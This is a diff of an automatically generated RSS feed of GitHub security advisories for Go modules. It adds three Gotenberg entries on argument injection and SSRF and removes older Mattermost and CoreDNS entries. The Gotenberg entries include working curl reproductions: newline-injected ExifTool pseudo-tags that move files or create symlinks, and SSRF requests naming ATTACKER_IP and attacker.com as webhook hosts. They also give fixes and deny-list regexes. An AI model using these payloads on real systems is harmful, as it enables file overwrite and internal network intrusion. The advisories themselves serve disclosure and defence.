@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-04-30T16:27:55.172Z</updated>
+    <updated>2026-04-30T17:27:43.947Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,290 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/gotenberg/gotenberg/v8] Gotenberg has ExifTool stdin argument injection via metadata value newlines (bypass of key sanitization fix)]]></title>
+        <id>https://github.com/advisories/GHSA-q7r4-hc83-hf2q</id>
+        <link href="https://github.com/advisories/GHSA-q7r4-hc83-hf2q"/>
+        <updated>2026-04-30T17:27:10.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="vulnerability-details">Vulnerability Details</h2>
+<p><strong>CWE</strong>: CWE-20 - Improper Input Validation</p>
+<p>The metadata value sanitization introduced in v8.30.1 (commit 405f106) only validates metadata KEYS via safeKeyPattern regex. Metadata VALUES are passed unsanitized to go-exiftool SetString(), which writes them as fmt.Fprintln(e.stdin, "-"+k+"="+str). A newline (\n) in a value splits the ExifTool stdin line into two separate arguments, allowing injection of arbitrary ExifTool pseudo-tags such as -FileName, -Directory, -SymLink, -HardLink. Docker-verified: HTTP 404 returned (file moved), /tmp/inject_proof created in container. This is a bypass of the incomplete fix in v8.30.1.</p>
+<h2 id="summary">Summary</h2>
+<p>The metadata write endpoint in v8.30.1 validates metadata <strong>keys</strong> for control characters (commit 405f106) but leaves metadata <strong>values</strong> unsanitized. go-exiftool's <code>WriteMetadata</code> sends each key/value pair to ExifTool's stdin as:</p>
+<pre><code>fmt.Fprintln(e.stdin, "-"+k+"="+str)
+</code></pre>
+<p>A <code>\n</code> character in <code>str</code> splits this into two separate stdin lines, injecting an arbitrary ExifTool pseudo-tag argument. The attacker controls what comes after the newline, enabling injection of <code>-FileName</code>, <code>-Directory</code>, <code>-SymLink</code>, <code>-HardLink</code>, and other dangerous pseudo-tags — the exact tags the key blocklist was designed to prevent.</p>
+<h2 id="root-cause">Root Cause</h2>
+<p><code>pkg/modules/exiftool/exiftool.go</code> — <code>WriteMetadata()</code> function:</p>
+<pre><code class="language-go">// KEY validation added in v8.30.1 (commit 405f106)
+for key := range metadata {
+    if !safeKeyPattern.MatchString(key) {  // ← only keys checked
+        return fmt.Errorf(...)
+    }
+}
+
+// VALUE passed through unsanitized:
+case string:
+    fileMetadata[0].SetString(key, val)  // ← val may contain \n
+</code></pre>
+<p>go-exiftool (<code>barasher/go-exiftool</code>) then writes:</p>
+<pre><code class="language-go">fmt.Fprintln(e.stdin, "-"+k+"="+str)
+// If str = "test\n-FileName=/tmp/inject_proof"
+// ExifTool receives two lines:
+//   -Title=test
+//   -FileName=/tmp/inject_proof
+</code></pre>
+<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
+<pre><code>1. Start Gotenberg:
+   docker run --name gotenberg-test -p 3001:3000 gotenberg/gotenberg:8
+
+2. Create a test PDF:
+   curl -s -F 'files=@/dev/stdin;filename=index.html;type=text/html' \
+     -o test.pdf http://localhost:3001/forms/chromium/convert/html \
+     &lt;&lt;&lt; '&lt;html&gt;&lt;body&gt;test&lt;/body&gt;&lt;/html&gt;'
+
+3. Inject -FileName via value newline:
+   curl -s -w "\nHTTP %{http_code}" \
+     -F 'files=@test.pdf;type=application/pdf' \
+     -F 'metadata={"Title":"test\n-FileName=/tmp/inject_proof"}' \
+     http://localhost:3001/forms/pdfengines/metadata/write
+   # Returns HTTP 404 (file moved away from temp path)
+
+4. Verify injection inside container:
+   docker exec gotenberg-test ls -la /tmp/inject_proof
+   # -rw-r--r-- 1 root root ... /tmp/inject_proof  (PDF moved here)
+
+5. Symlink injection:
+   curl -s -w "\nHTTP %{http_code}" \
+     -F 'files=@test.pdf;type=application/pdf' \
+     -F 'metadata={"Title":"test\n-SymLink=/tmp/sym_inject"}' \
+     http://localhost:3001/forms/pdfengines/metadata/write
+   docker exec gotenberg-test ls -la /tmp/sym_inject
+   # lrwxrwxrwx ... /tmp/sym_inject -&gt; /tmp/.../source.pdf
+</code></pre>
+<h2 id="impact">Impact</h2>
+<p>An unauthenticated attacker can:</p>
+<ol>
+<li><strong>Rename/move</strong> any PDF being processed to an arbitrary path in the container filesystem (running as root by default)</li>
+<li><strong>Overwrite</strong> arbitrary files — e.g., <code>-Directory=/etc/ -FileName=passwd</code> injects two lines, moving the PDF to <code>/etc/passwd</code>, corrupting the system user database</li>
+<li><strong>Create symlinks</strong> at arbitrary paths via <code>-SymLink=</code>, enabling subsequent read/write primitives</li>
+<li><strong>Create hard links</strong> via <code>-HardLink=</code>, persisting data beyond temp directory cleanup</li>
+</ol>
+<p>This is a complete bypass of the key-sanitization fix introduced in v8.30.1 (commit 405f106). The fix validated the wrong side of the <code>=</code> sign.</p>
+<h2 id="proposed-fix">Proposed Fix</h2>
+<p>Add value sanitization parallel to the existing key check in <code>WriteMetadata</code>:</p>
+<pre><code class="language-go">for key, value := range metadata {
+    if !safeKeyPattern.MatchString(key) {
+        return fmt.Errorf("write PDF metadata with ExifTool: invalid metadata key %q", key)
+    }
+    if str, ok := value.(string); ok {
+        if strings.ContainsAny(str, "\n\r\x00") {
+            return fmt.Errorf("write PDF metadata with ExifTool: invalid value for key %q (contains control character)", key)
+        }
+    }
+}
+</code></pre>
+<p>Or, apply the same <code>safeKeyPattern</code> logic to string values, or percent-encode newlines before passing to go-exiftool.</p>
+<h3 id="vulnerable-code">Vulnerable Code</h3>
+<pre><code class="language-go">// See description for details
+</code></pre>
+<h2 id="steps-to-reproduce-1">Steps to Reproduce</h2>
+<ol>
+<li>Set up the application using the default configuration</li>
+<li>See the vulnerability details above</li>
+</ol>
+<h2 id="impact-1">Impact</h2>
+<p>This vulnerability may allow an attacker to compromise the application.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/gotenberg/gotenberg/security/advisories/GHSA-q7r4-hc83-hf2q">https://github.com/gotenberg/gotenberg/security/advisories/GHSA-q7r4-hc83-hf2q</a></li>
+<li><a href="https://github.com/gotenberg/gotenberg/releases/tag/v8.31.0">https://github.com/gotenberg/gotenberg/releases/tag/v8.31.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-q7r4-hc83-hf2q">https://github.com/advisories/GHSA-q7r4-hc83-hf2q</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-q7r4-hc83-hf2q</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-04-30T17:27:10.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/gotenberg/gotenberg/v8] Gotenberg Vulnerable to Unauthenticated SSRF via Unfiltered Webhook URL]]></title>
+        <id>https://github.com/advisories/GHSA-5vh4-rgv7-p9g4</id>
+        <link href="https://github.com/advisories/GHSA-5vh4-rgv7-p9g4"/>
+        <updated>2026-04-30T17:24:34.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="cve-report--unauthenticated-ssrf-via-unfiltered-webhook-url-in-gotenberg">CVE Report — Unauthenticated SSRF via Unfiltered Webhook URL in Gotenberg</h1>
+<h2 id="severity">Severity</h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>CVSS v3.1</td>
+<td><strong>8.6 High</strong></td>
+</tr>
+<tr>
+<td>Vector</td>
+<td><code>AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N</code></td>
+</tr>
+<tr>
+<td>CWE</td>
+<td>CWE-918 — Server-Side Request Forgery</td>
+</tr>
+<tr>
+<td>Auth</td>
+<td>None</td>
+</tr>
+</tbody></table>
+<p><strong>Affected:</strong> Gotenberg 8.29.1 — default <code>gotenberg/gotenberg:8</code> Docker image.</p>
+<hr>
+<h2 id="impact">Impact</h2>
+<p>An unauthenticated attacker with network access to Gotenberg can force it to make outbound HTTP POST requests to any internal or external destination by supplying an arbitrary URL in the <code>Gotenberg-Webhook-Url</code> request header.</p>
+<p><strong>This is a blind SSRF.</strong> Gotenberg POSTs the converted document to the webhook URL and checks only whether the response status code is an error (&gt;= 400). The response body from the SSRF target is never forwarded to the attacker. The <code>Gotenberg-Webhook-Error-Url</code> header — if supplied — receives the original converted PDF when the webhook POST fails, not the target's response body.</p>
+<p>The practical impact is therefore:</p>
+<ul>
+<li><strong>Internal network probing:</strong> if the error URL is NOT called, the target returned 2xx → host and port are open and accepting POST requests. If the error URL IS called, the target returned 4xx/5xx or timed out → port closed or service rejected the request. This allows mapping internal infrastructure one request at a time. </li>
+<li><strong>Forced POST to internal services:</strong> any internal service that performs a side effect on POST (triggering a webhook, writing state, executing a job) can be abused without reading its response.</li>
+<li><strong>Cloud metadata interaction:</strong> Gotenberg can be forced to POST to <code>http://169.254.169.254/</code> — confirming reachability and probing available paths — but cannot read the credential response body through this channel alone.</li>
+</ul>
+<p>The retryable client issues up to 4 automatic retries per request, meaning one attacker request generates up to 4 probes against the internal target.</p>
+<hr>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<pre><code class="language-bash"># Minimal SSRF trigger — replace ATTACKER_IP with your listener &amp; INTERNAL_IP with the target.
+curl -s -o /dev/null -w "HTTP:%{http_code}" \
+  -X POST 'http://TARGET:3000/forms/chromium/convert/url' \
+  -H 'Gotenberg-Webhook-Url: http://INTERNAL_IP:9999/capture' \
+  -H 'Gotenberg-Webhook-Error-Url: http://ATTACKER_IP:9999/error' \
+  -F 'url=https://example.com'
+</code></pre>
+<hr>
+<h2 id="root-cause">Root Cause</h2>
+<p><code>FilterDeadline</code> in <code>filter.go</code> is the intended URL gating function but its contract fails open: when both the allow and deny lists are empty (the default), it returns <code>nil</code> unconditionally, allowing any URL through.</p>
+<pre><code class="language-go">func FilterDeadline(allowed, denied []*regexp2.Regexp, s string, deadline time.Time) error {
+    if len(allowed) &gt; 0 { ... }  // skipped — empty by default
+    if len(denied) &gt; 0  { ... }  // skipped — empty by default
+    return nil                    // any URL passes
+}
+</code></pre>
+<p>The unvalidated URL is then stored verbatim and used as the destination for an outbound <code>retryablehttp</code> request in <code>client.go:62</code>.</p>
+<hr>
+<h2 id="recommendations">Recommendations</h2>
+<p><strong>Gotenberg maintainers:</strong> Invert the default — deny all webhook URLs unless an explicit allowlist is configured, or ship a built-in denylist covering RFC-1918 and link-local ranges.</p>
+<p><strong>Operators (immediate):</strong></p>
+<pre><code class="language-bash"># Restrict to your own receiver
+--env GOTENBERG_API_WEBHOOK_ALLOW_LIST="https://my-receiver\.example\.com/.*"
+# Or block internal ranges
+--env GOTENBERG_API_WEBHOOK_DENY_LIST="^https?://(169\.254\.|10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)"
+</code></pre>
+<hr>
+<h2 id="attribution">Attribution</h2>
+<p>This is a Gotenberg-only issue. No third-party library is at fault. The root cause is an insecure default in <code>FilterDeadline</code> where an unconfigured state means "allow all" rather than "deny all".</p>
+<hr>
+<h2 id="timeline">Timeline</h2>
+<table>
+<thead>
+<tr>
+<th>Date</th>
+<th>Event</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>2026-04-04</td>
+<td>Vulnerability discovered</td>
+</tr>
+<tr>
+<td>2026-04-05</td>
+<td>SSRF confirmed — outbound POST captured at local listener</td>
+</tr>
+<tr>
+<td>2026-04-05</td>
+<td>Report drafted for disclosure</td>
+</tr>
+</tbody></table>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/gotenberg/gotenberg/security/advisories/GHSA-5vh4-rgv7-p9g4">https://github.com/gotenberg/gotenberg/security/advisories/GHSA-5vh4-rgv7-p9g4</a></li>
+<li><a href="https://github.com/gotenberg/gotenberg/releases/tag/v8.31.0">https://github.com/gotenberg/gotenberg/releases/tag/v8.31.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-5vh4-rgv7-p9g4">https://github.com/advisories/GHSA-5vh4-rgv7-p9g4</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-5vh4-rgv7-p9g4</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-04-30T17:24:33.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/gotenberg/gotenberg/v8] Gotenberg has case-insensitive URL scheme that bypasses webhook and downloadFrom deny-list SSRF protection]]></title>
+        <id>https://github.com/advisories/GHSA-5q7p-7jgv-ww56</id>
+        <link href="https://github.com/advisories/GHSA-5q7p-7jgv-ww56"/>
+        <updated>2026-04-30T17:19:50.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="vulnerability-details">Vulnerability Details</h2>
+<p><strong>CWE</strong>: CWE-918 - Server-Side Request Forgery (SSRF)</p>
+<p>The default private-IP deny-lists for --webhook-deny-list and --api-download-from-deny-list use a case-sensitive regex (^https?://). Any uppercase URL scheme variant (HTTP://, HTTPS://, Http://) bypasses the pattern. Go's net/url.Parse() normalizes the scheme to lowercase when making the outbound TCP connection, so the connection succeeds normally. Affected: pkg/gotenberg/filter.go:FilterDeadline(), pkg/modules/webhook/webhook.go:42, pkg/modules/api/api.go:199. Confirmed in Docker: <a href="http://172.17.0.1:12345/">http://172.17.0.1:12345/</a> returns HTTP 403 (blocked), HTTP://172.17.0.1:12345/ returns HTTP 202 (bypassed, TCP connection attempted). Same pattern as CVE-2026-27018/GHSA-jjwv-57xh-xr6r but in newly added webhook+downloadFrom deny-lists (commit 3f01ca1, 2026-04-07). Affected versions: &lt;= 8.30.1. CVSS: AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N = 9.1.</p>
+<h2 id="summary">Summary</h2>
+<p>The default private-IP deny-lists for <code>--webhook-deny-list</code> and <code>--api-download-from-deny-list</code> use a case-sensitive regex (<code>^https?://</code>). Any uppercase URL scheme variant (<code>HTTP://</code>, <code>HTTPS://</code>, <code>Http://</code>) bypasses the pattern. Go's <code>net/url.Parse()</code> normalizes the scheme to lowercase when making the outbound TCP connection, so the connection succeeds normally.</p>
+<p>The same bypass (case-insensitive scheme) was previously reported for the Chromium deny-list in CVE-2026-27018 (GHSA-jjwv-57xh-xr6r), but the newly added deny-lists for webhook and downloadFrom contain the identical flaw.</p>
+<p><strong>Affected file/function</strong>: <code>pkg/gotenberg/filter.go:FilterDeadline()</code>, <code>pkg/modules/webhook/webhook.go:42</code> (default regex), <code>pkg/modules/api/api.go:199</code> (default regex)</p>
+<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
+<pre><code>1. Start Gotenberg:
+   docker run --rm -d -p 3001:3000 --name gotenberg-test gotenberg/gotenberg:8
+
+2. Baseline — lowercase http:// is blocked (HTTP 403):
+   curl -s -w "\nHTTP %{http_code}" -X POST http://localhost:3001/forms/chromium/convert/url \
+     -H "Gotenberg-Webhook-Url: http://172.17.0.1:12345/callback" \
+     -H "Gotenberg-Webhook-Events-Url: http://attacker.com/events" \
+     -F "url=https://example.com/"
+
+3. Bypass — uppercase HTTP:// bypasses deny-list (HTTP 202, connection attempted):
+   curl -s -w "\nHTTP %{http_code}" -X POST http://localhost:3001/forms/chromium/convert/url \
+     -H "Gotenberg-Webhook-Url: HTTP://172.17.0.1:12345/callback" \
+     -H "Gotenberg-Webhook-Events-Url: http://attacker.com/events" \
+     -F "url=https://example.com/"
+   # Returns 202 + Gotenberg logs: "Post \"http://172.17.0.1:12345/callback\": connection refused"
+
+4. downloadFrom bypass (response content included in PDF):
+   curl -s -w "\nHTTP %{http_code}" http://localhost:3001/forms/chromium/convert/html \
+     -F 'files=@/dev/stdin;filename=index.html;type=text/html' \
+     -F 'downloadFrom=[{"url":"HTTP://172.17.0.1:12345/secret.html"}]' &lt;&lt;&lt; '&lt;html&gt;&lt;body&gt;test&lt;/body&gt;&lt;/html&gt;'
+   # Error is "Unable to download file" (connection refused), not "filter URL" — bypass confirmed
+</code></pre>
+<h2 id="impact">Impact</h2>
+<p>An unauthenticated attacker can access internal network services (private IP ranges, loopback, link-local) that the deny-list was designed to block. The <code>downloadFrom</code> SSRF can exfiltrate content from internal services that respond with <code>Content-Disposition</code> headers. In cloud environments, this could allow access to instance metadata services (e.g., <code>HTTP://169.254.169.254/latest/meta-data/</code>). This bypasses the same security control that was patched in CVE-2026-27018.</p>
+<h2 id="fix">Fix</h2>
+<p>Normalize the URL scheme to lowercase before passing to <code>FilterDeadline</code>, or compile deny-list regexes with the case-insensitive flag (<code>(?i)</code>).</p>
+<h3 id="vulnerable-code">Vulnerable Code</h3>
+<pre><code class="language-go">// See description for details
+</code></pre>
+<h2 id="steps-to-reproduce-1">Steps to Reproduce</h2>
+<ol>
+<li>Set up the application using the default configuration</li>
+<li>See the vulnerability details above</li>
+</ol>
+<h2 id="impact-1">Impact</h2>
+<p>This vulnerability may allow an attacker to compromise the application.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/gotenberg/gotenberg/security/advisories/GHSA-5q7p-7jgv-ww56">https://github.com/gotenberg/gotenberg/security/advisories/GHSA-5q7p-7jgv-ww56</a></li>
+<li><a href="https://github.com/gotenberg/gotenberg/releases/tag/v8.31.0">https://github.com/gotenberg/gotenberg/releases/tag/v8.31.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-5q7p-7jgv-ww56">https://github.com/advisories/GHSA-5q7p-7jgv-ww56</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-5q7p-7jgv-ww56</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-04-30T17:19:49.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/tinfoil-factory/netfoil] netfoil's optional seccomp sandboxing was not applied]]></title>
         <id>https://github.com/advisories/GHSA-vjgj-42f6-7997</id>
@@ -522,290 +806,5 @@ Payload 1 (Hex):</p>
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-04-17T15:31:17.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/mattermost/mattermost/server/v8] Mattermost has session spoofing due to lack of single-use consumption of guest magic link tokens enforcement]]></title>
-        <id>https://github.com/advisories/GHSA-mh4x-rmrx-3hp4</id>
-        <link href="https://github.com/advisories/GHSA-mh4x-rmrx-3hp4"/>
-        <updated>2026-04-28T22:57:44.000Z</updated>
-        <content type="html"><![CDATA[<p>Mattermost versions 10.11.x &lt;= 10.11.12, 11.5.x &lt;= 11.5.0, 11.4.x &lt;= 11.4.2, 11.3.x &lt;= 11.3.2 fail to enforce atomic single-use consumption of guest magic link tokens, which allows an attacker with access to a valid magic link to establish multiple independent authenticated sessions via concurrent requests. Mattermost Advisory ID: MMSA-2026-00624.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-3590">https://nvd.nist.gov/vuln/detail/CVE-2026-3590</a></li>
-<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
-<li><a href="https://github.com/advisories/GHSA-mh4x-rmrx-3hp4">https://github.com/advisories/GHSA-mh4x-rmrx-3hp4</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-mh4x-rmrx-3hp4</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-04-17T15:31:17.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/coredns/coredns] CoreDNS has TSIG authentication bypass on gRPC and QUIC transports]]></title>
-        <id>https://github.com/advisories/GHSA-vp29-5652-4fw9</id>
-        <link href="https://github.com/advisories/GHSA-vp29-5652-4fw9"/>
-        <updated>2026-04-28T22:54:34.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>The gRPC, QUIC, DoH, and DoH3 transports in CoreDNS incorrectly handle TSIG authentication.</p>
-<p>For gRPC and QUIC, CoreDNS checks whether the TSIG key name exists in the config, but does not actually verify the TSIG HMAC. If the key name matches, <code>tsigStatus</code> remains nil and the tsig plugin treats the request as "verified".</p>
-<p>For DoH and DoH3, the issue is worse: TSIG is not verified at all. The DoH response writer has <code>TsigStatus()</code> hardcoded to return nil, so any request containing a TSIG record is treated as authenticated, even if the key name is invalid and the MAC is garbage.</p>
-<p>As a result, attackers may bypass TSIG authentication on affected transports and access TSIG-protected functionality such as AXFR/IXFR zone transfers, dynamic updates, or other TSIG-gated plugin behavior.</p>
-<h3 id="details">Details</h3>
-<p>In <code>server_grpc.go</code> and <code>server_quic.go</code>, the TSIG handling checks whether the TSIG key name exists, but does not call <code>dns.TsigVerify()</code>.</p>
-<p>Relevant code before fix:</p>
-<pre><code class="language-go">if tsig := msg.IsTsig(); tsig != nil {
-    if s.tsigSecret == nil {
-        w.tsigStatus = dns.ErrSecret
-    } else if _, ok := s.tsigSecret[tsig.Hdr.Name]; !ok {
-        w.tsigStatus = dns.ErrSecret
-    }
-    // key found -&gt; nothing happens -&gt; tsigStatus stays nil -&gt; "verified"
-}
-</code></pre>
-<p>This means that for gRPC and QUIC, a request with a known TSIG key name but an invalid MAC is accepted as authenticated.</p>
-<p>PRs #7943 and #7947 partially addressed this area by adding key name checks for gRPC and QUIC, but did not add HMAC verification.</p>
-<p>The DoH and DoH3 paths have an even weaker failure mode. In <code>https.go</code>, <code>DoHWriter.TsigStatus()</code> returned nil unconditionally:</p>
-<pre><code class="language-go">func (d *DoHWriter) TsigStatus() error {
-    return nil
-}
-</code></pre>
-<p>In <code>server_https.go</code>, the incoming DNS message is unpacked from the HTTP request and passed directly into <code>ServeDNS()</code> without checking <code>msg.IsTsig()</code>, without looking up the TSIG key name, and without calling <code>dns.TsigVerify()</code>.</p>
-<p>The same pattern exists in the DoH3 path in <code>server_https3.go</code>.</p>
-<p>The effective DoH/DoH3 flow before the fix was:</p>
-<ol>
-<li>HTTP or HTTP/3 request arrives.</li>
-<li>DNS message is unpacked from the request.</li>
-<li>A <code>DoHWriter</code> is created.</li>
-<li>The message is passed to <code>ServeDNS()</code>.</li>
-<li>The tsig plugin checks <code>w.TsigStatus()</code>.</li>
-<li><code>TsigStatus()</code> returns nil.</li>
-<li>nil is interpreted as successful TSIG verification.</li>
-</ol>
-<p>This means that for DoH and DoH3, CoreDNS did not even require a valid TSIG key name. Any TSIG record was enough to satisfy the tsig plugin, regardless of key name or MAC contents.</p>
-<h3 id="poc">PoC</h3>
-<p>Setup: built CoreDNS from master at commit <code>12d9457</code> and also verified against the v1.14.2 release binary. Configured a single test zone with 9 records and <code>tsig { require all }</code>.</p>
-<p>Listeners used the same TSIG configuration and key:</p>
-<ul>
-<li>TCP on port 1053, using the normal <code>dns.Server</code> path where TSIG HMAC verification works correctly</li>
-<li>gRPC on port 1443, using manual TSIG handling</li>
-<li>DoH on port 8443</li>
-<li>DoH3 with the same TSIG configuration</li>
-</ul>
-<h4 id="grpc--quic-behavior">gRPC / QUIC behavior</h4>
-<p>A test client sent AXFR requests over gRPC with a valid TSIG key name but forged MAC values. The same requests were sent over TCP for comparison.</p>
-<table>
-<thead>
-<tr>
-<th>MAC used</th>
-<th>gRPC</th>
-<th>TCP</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>32 zero bytes</td>
-<td>BYPASS, 9 records returned</td>
-<td>BADSIG</td>
-</tr>
-<tr>
-<td>32 random bytes</td>
-<td>BYPASS, 9 records returned</td>
-<td>BADSIG</td>
-</tr>
-<tr>
-<td>HMAC computed with wrong secret</td>
-<td>BYPASS, 9 records returned</td>
-<td>BADSIG</td>
-</tr>
-<tr>
-<td>truncated to 16 bytes</td>
-<td>BYPASS, 9 records returned</td>
-<td>BADSIG</td>
-</tr>
-<tr>
-<td>single byte <code>0x41</code></td>
-<td>BYPASS, 9 records returned</td>
-<td>BADSIG</td>
-</tr>
-<tr>
-<td>empty MAC</td>
-<td>BYPASS, 9 records returned</td>
-<td>BADSIG</td>
-</tr>
-<tr>
-<td>wrong key name + zero MAC</td>
-<td>REJECTED, NOTAUTH/BADKEY</td>
-<td>REJECTED, NOTAUTH/BADKEY</td>
-</tr>
-</tbody></table>
-<p>6 out of 7 forged TSIG requests bypassed authentication over gRPC and returned a full zone transfer. The only rejected case was the wrong key name, because the gRPC path checked whether the key name existed.</p>
-<p>The same class applied to QUIC.</p>
-<h4 id="doh--doh3-behavior">DoH / DoH3 behavior</h4>
-<p>For DoH, a test client sent DNS queries over HTTPS POST to <code>/dns-query</code> with forged TSIG records. These requests were also compared against TCP.</p>
-<table>
-<thead>
-<tr>
-<th>TSIG variant</th>
-<th>DoH result</th>
-<th>TCP result</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>32 zero bytes</td>
-<td>BYPASS, NOERROR</td>
-<td>BADSIG</td>
-</tr>
-<tr>
-<td>32 random bytes</td>
-<td>BYPASS, NOERROR</td>
-<td>BADSIG</td>
-</tr>
-<tr>
-<td>HMAC computed with wrong secret</td>
-<td>BYPASS, NOERROR</td>
-<td>BADSIG</td>
-</tr>
-<tr>
-<td>truncated to 16 bytes</td>
-<td>BYPASS, NOERROR</td>
-<td>BADSIG</td>
-</tr>
-<tr>
-<td>single byte <code>0x41</code></td>
-<td>BYPASS, NOERROR</td>
-<td>BADSIG</td>
-</tr>
-<tr>
-<td>empty MAC</td>
-<td>BYPASS, NOERROR</td>
-<td>BADSIG</td>
-</tr>
-<tr>
-<td>bad key name</td>
-<td>BYPASS, NOERROR</td>
-<td>NOTAUTH/BADKEY</td>
-</tr>
-<tr>
-<td>no TSIG record</td>
-<td>REJECTED, REFUSED</td>
-<td>REJECTED, REFUSED</td>
-</tr>
-</tbody></table>
-<p>7 out of 8 cases bypassed authentication over DoH. Every request containing a TSIG record was accepted, including requests with an invalid key name.</p>
-<p>An AXFR request over DoH with a forged TSIG record using a zero-byte MAC returned the full test zone.</p>
-<p>The same pattern applies to DoH3 because it used the same <code>DoHWriter</code> TSIG behavior and did not verify TSIG before passing the message into the plugin chain.</p>
-<p>To confirm that the tsig plugin itself was enforcing policy, requests with no TSIG record were rejected with <code>REFUSED</code>. The bypass happens because the transport layer reports successful TSIG verification when verification either did not happen or only checked the key name.</p>
-<h3 id="impact">Impact</h3>
-<p>An unauthenticated network attacker may bypass TSIG authentication on affected CoreDNS transports.</p>
-<p>Depending on configuration, this may allow an attacker to:</p>
-<ul>
-<li>perform AXFR or IXFR zone transfers over affected transports</li>
-<li>dump TSIG-protected zone data</li>
-<li>submit dynamic DNS updates if enabled</li>
-<li>bypass other TSIG-gated plugin behavior</li>
-<li>authenticate over DoH or DoH3 without knowing a valid TSIG key name</li>
-</ul>
-<p>The DoH and DoH3 variants have a lower exploitation bar than gRPC and QUIC because the attacker does not need to know a configured TSIG key name. Any TSIG record is treated as valid.</p>
-<h3 id="affected-transports">Affected transports</h3>
-<ul>
-<li>gRPC</li>
-<li>QUIC</li>
-<li>DoH</li>
-<li>DoH3</li>
-</ul>
-<h3 id="workarounds">Workarounds</h3>
-<p>If upgrading is not immediately possible:</p>
-<ul>
-<li>Disable gRPC, QUIC, DoH, and DoH3 listeners where TSIG authentication is required.</li>
-<li>Restrict network-level access to affected transport ports to trusted sources only.</li>
-<li>Avoid exposing TSIG-protected functionality such as AXFR, IXFR, or dynamic updates over affected transports.</li>
-</ul>
-<h3 id="fix">Fix</h3>
-<p>Affected transports must verify TSIG before passing the DNS message into the plugin chain.</p>
-<p>For requests containing a TSIG record, the transport should:</p>
-<ol>
-<li>check whether TSIG secrets are configured</li>
-<li>verify that the TSIG key name exists</li>
-<li>call <code>dns.TsigVerify()</code> against the original wire-format message</li>
-<li>store the resulting status in the response writer</li>
-<li>return that status from <code>TsigStatus()</code></li>
-</ol>
-<p>A successful key name lookup alone is not sufficient. A nil TSIG status must only be returned after successful HMAC verification.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/coredns/coredns/security/advisories/GHSA-vp29-5652-4fw9">https://github.com/coredns/coredns/security/advisories/GHSA-vp29-5652-4fw9</a></li>
-<li><a href="https://github.com/coredns/coredns/releases/tag/v1.14.3">https://github.com/coredns/coredns/releases/tag/v1.14.3</a></li>
-<li><a href="https://github.com/advisories/GHSA-vp29-5652-4fw9">https://github.com/advisories/GHSA-vp29-5652-4fw9</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-vp29-5652-4fw9</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-04-28T22:54:32.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/coredns/coredns] CoreDNS has TSIG authentication bypass on DoT, DoH, DoH3, DoQ, and gRPC]]></title>
-        <id>https://github.com/advisories/GHSA-qhmp-q7xh-99rh</id>
-        <link href="https://github.com/advisories/GHSA-qhmp-q7xh-99rh"/>
-        <updated>2026-04-28T22:46:18.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
